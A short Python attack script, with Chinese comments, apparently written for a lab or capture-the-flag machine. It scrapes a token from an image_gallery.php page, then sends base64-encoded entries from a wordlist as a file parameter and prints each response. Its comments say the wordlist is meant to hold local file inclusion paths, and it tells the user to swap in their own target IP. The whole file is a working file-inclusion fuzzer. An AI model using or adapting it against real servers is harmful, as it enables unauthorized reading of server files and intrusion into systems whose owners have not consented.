import requests
import base64
import re

# 获取初始页面以提取时间戳/Token
r = requests.get(url = "http://172.16.33.89/image_gallery.php")
respond = r.text

# 使用正则提取变量 't' 的值（推测为 timeNow）
t = re.findall(r't=(.+?)&f', respond)[0]

# 读取本地字典文件
wordlistFile = open('payloads', 'r')

for line in wordlistFile.readlines():
    # 清理换行符
    word = line.strip('\r').strip('\n')
    # 将字典中的内容进行 Base64 编码
    payload = base64.b64encode(word.encode("utf-8"))
    
    try:
        URL = "http://172.16.33.89/image_gallery.php"
        ##### IMPORTANT to change this IP to Target IP in your network #####
        
        # 构造 GET 请求参数
        PARAMS = {'t': t, 'f': payload}
        r1 = requests.get(url = URL, params = PARAMS)
        
        # 打印请求信息和响应结果
        print('\n\n\n')
        print(r1.request.url)
        print('-------------------- start response --------------------')
        response = r1.text
        
        if not response:
            print('No response')
        else:
            print(response)
            print('-------------------- end response ----------------------')
            
    except:
        print('Error XXXXXXXXXXXXXXXXXXXXXX')
        pass


# 当前目录下面创建一个payload文件
# 里面可以把LFI链接放上去